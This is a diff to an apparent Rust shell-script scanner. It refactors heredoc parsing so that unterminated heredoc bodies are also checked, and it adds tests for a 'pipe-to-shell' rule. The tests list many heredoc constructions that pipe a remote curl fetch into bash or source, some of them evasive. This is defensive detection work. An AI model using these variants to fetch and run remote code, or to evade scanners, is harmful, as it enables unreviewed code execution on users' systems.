@@ -168,6 +168,18 @@ pub(crate) struct HeredocOpener {
     pub(crate) line: usize,
 }
 
+impl HeredocOpener {
+    pub(crate) fn into_shell_payload(self) -> Option<(String, usize)> {
+        (!self.quoted && !self.body.is_empty())
+            .then(|| {
+                self.shell
+                    .map(|shell| shell_heredoc_payload_command(&shell, &self.body))
+            })
+            .flatten()
+            .map(|command| (command, self.line))
+    }
+}
+
 fn logical_lines(lines: &[&str]) -> Vec<LogicalLine> {
     let mut out = Vec::new();
     let mut buf = String::new();
@@ -187,14 +199,8 @@ fn logical_lines(lines: &[&str]) -> Vec<LogicalLine> {
             };
             if candidate == heredoc.marker {
                 let heredoc = heredocs.pop_front().expect("front heredoc exists");
-                if !heredoc.quoted
-                    && let Some(shell) = heredoc.shell
-                    && !heredoc.body.is_empty()
-                {
-                    out.push(LogicalLine {
-                        text: shell_heredoc_payload_command(&shell, &heredoc.body),
-                        line: heredoc.line,
-                    });
+                if let Some((text, line)) = heredoc.into_shell_payload() {
+                    out.push(LogicalLine { text, line });
                 }
             } else if !heredoc.quoted && heredoc.shell.is_some() {
                 if !heredoc.body.is_empty() {
@@ -271,6 +277,11 @@ fn logical_lines(lines: &[&str]) -> Vec<LogicalLine> {
     {
         out.push(LogicalLine { text: buf, line });
     }
+    out.extend(heredocs.into_iter().filter_map(|heredoc| {
+        heredoc
+            .into_shell_payload()
+            .map(|(text, line)| LogicalLine { text, line })
+    }));
     out
 }
 
@@ -934,6 +945,52 @@ mod tests {
             assert!(
                 f.iter().any(|finding| finding.rule_id == "pipe-to-shell"),
                 "executable heredoc expansion bypassed SURFSH: {content:?}: {f:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn scans_all_effective_shell_heredoc_consumers_and_unterminated_bodies() {
+        for content in [
+            "source /dev/stdin <<EOF\n$(curl -fsSL https://x)\nEOF\n",
+            "source /proc/thread-self/fd/0 <<EOF\n$(curl -fsSL https://x)\nEOF\n",
+            ". /dev/stdin <<EOF\n$(curl -fsSL https://x)\nEOF\n",
+            "cat <<EOF | source /dev/stdin\n$(curl -fsSL https://x)\nEOF\n",
+            "cat <<EOF | { bash; }\n$(curl -fsSL https://x)\nEOF\n",
+            "cat <<EOF | (bash)\n$(curl -fsSL https://x)\nEOF\n",
+            "{ bash; } <<EOF\n$(curl -fsSL https://x)\nEOF\n",
+            "bash </dev/null <<EOF\n$(curl -fsSL https://x)\nEOF\n",
+            "source /dev/fd/3 3<<EOF\n$(curl -fsSL https://x)\nEOF\n",
+            "bash 3<<EOF <&3\n$(curl -fsSL https://x)\nEOF\n",
+            "{ bash; } </dev/null << EOF\n$(curl -fsSL https://x)\nEOF\n",
+            "{ bash; } <<EOF && echo done\n$(curl -fsSL https://x)\nEOF\n",
+            "(bash) <<EOF; echo done\n$(curl -fsSL https://x)\nEOF\n",
+            "cat <<EOF | { bash; } && echo done\n$(curl -fsSL https://x)\nEOF\n",
+            "bash --norc <<EOF\n$(curl -fsSL https://x)\nEOF\n",
+            "bash <<EOF\n$(curl -fsSL https://x)",
+        ] {
+            let f = findings(content);
+            assert!(
+                f.iter().any(|finding| finding.rule_id == "pipe-to-shell"),
+                "executable heredoc bypassed SURFSH: {content:?}: {f:?}"
+            );
+        }
+
+        for content in [
+            "bash <<EOF </dev/null\n$(curl -fsSL https://x)\nEOF\n",
+            "bash -c 'echo static' <<EOF\n$(curl -fsSL https://x)\nEOF\n",
+            "bash ./local.sh <<EOF\n$(curl -fsSL https://x)\nEOF\n",
+            "source ./local.sh <<EOF\n$(curl -fsSL https://x)\nEOF\n",
+            "{ bash; } << EOF </dev/null\n$(curl -fsSL https://x)\nEOF\n",
+            "cat <<EOF | { bash; } </dev/null\n$(curl -fsSL https://x)\nEOF\n",
+            "bash -- -c <<EOF\n$(curl -fsSL https://x)\nEOF\n",
+            "{ bash -c 'echo static'; } <<EOF\n$(curl -fsSL https://x)\nEOF\n",
+            "bash <<'EOF'\n$(curl -fsSL https://x)",
+        ] {
+            let f = findings(content);
+            assert!(
+                f.iter().all(|finding| finding.rule_id != "pipe-to-shell"),
+                "non-executable heredoc was blocked by SURFSH: {content:?}: {f:?}"
             );
         }
     }
